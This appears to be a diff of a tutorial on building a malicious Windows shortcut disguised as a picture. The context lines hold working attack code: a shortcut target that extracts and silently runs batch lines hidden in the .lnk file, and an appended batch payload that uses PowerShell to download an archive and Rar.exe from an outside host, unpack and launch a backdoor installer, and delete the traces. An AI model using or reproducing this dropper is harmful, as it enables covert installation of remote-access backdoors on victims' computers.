@@ -13,6 +13,7 @@ All we need is the winrar archiver, or rather Rar.exe and our malicious RMS or R
 We have already dealt with the introductory part, let's proceed to the assembly.
 
 We will mask it under the picture, therefore we create a shortcut on the desktop and indicate the code in the location:
+
 ---
 ~~~bat
 %COMSPEC% /c "copy /Y image.lnk %temp%\1&findstr /c:"@ECHO" %temp%\1>%temp%\s.bat&start /MIN %TEMP%\s.bat&exit"
@@ -41,6 +42,7 @@ And optionally we put any icon, but since we want to disguise it as a picture, w
 </p>
 
 Open image.lnk in any text editor Notepad++ in my case, version 7.8.6 (Open np++ and transfer our lnk file to the main window) and add our code to download and launch the backdoor from the server to the next line:
+
 ---
 ~~~bat
 @ECHO OFF && IF EXIST "%temp%\lnkexp.txt" (exit) ELSE echo lnkexp»%temp%\lnkexp.txt && powershell -Command (new-object System.Net.WebClient).DownloadFile('http://site.ru/install.rar', '%temp%/install.rar') && powershell -Command (new-object System.Net.WebClient).DownloadFile('http://site.ru/Rar.exe', '%temp%/Rar.exe') && %temp%\Rar.exe x -t -o+ -p123321 %temp%\install.rar %temp%\ && %temp%\install.exe && del /f /q %temp%\install.rar && del /f /q %temp%\Rar.exe && exit
